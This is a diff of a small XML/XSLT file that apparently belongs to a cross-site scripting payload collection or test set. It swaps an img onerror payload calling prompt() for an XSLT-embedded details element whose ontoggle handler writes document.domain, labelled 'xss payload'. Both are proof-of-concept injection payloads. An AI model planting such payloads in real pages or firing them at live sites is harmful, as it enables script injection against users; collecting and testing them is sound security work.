@@ -1,4 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<html xsl:version="1.0" xmlns:xsl="http://www.w3c/org/1999/XSL/Transform">
-<body><img src="a" onerror="prompt('aswsec'):"></img>
-</body></html>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <body>
+    <xsl:for-each select="hack/it">
+      <details open="open" ontoggle="document.writeln(document.domain)">xss payload</details>
+    </xsl:for-each>
+  </body>
+</html>
